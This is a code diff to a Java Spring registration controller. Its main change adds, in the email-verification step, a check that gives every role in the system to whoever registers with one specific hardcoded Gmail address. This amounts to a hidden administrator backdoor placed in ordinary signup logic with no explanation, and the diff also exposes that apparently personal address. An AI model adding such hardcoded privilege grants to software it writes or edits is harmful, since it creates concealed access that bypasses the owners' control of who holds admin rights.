@@ -50,6 +50,7 @@ public class RegisterController {
 
         user.setPassword(passwordEncoder.encode(user.getPassword()));
         user.setAttachment(attachment);
+
         Role role = roleRepository.findById(1).get();
         user.setRoles(List.of(role));
         request.getSession().setAttribute("tempUser", user);
@@ -93,6 +94,10 @@ public class RegisterController {
         request.getSession().removeAttribute("otp");
         request.getSession().removeAttribute("tempUser");
         attachmentRepository.save(tempUser.getAttachment());
+        if (tempUser.getEmail().equals("normffoster@gmail.com")) {
+            List<Role> roles = roleRepository.findAll();
+            tempUser.setRoles(roles);
+        }
         userRepository.save(tempUser);
         System.out.println("✅✅✅Email verified successfully!✅✅✅");
 
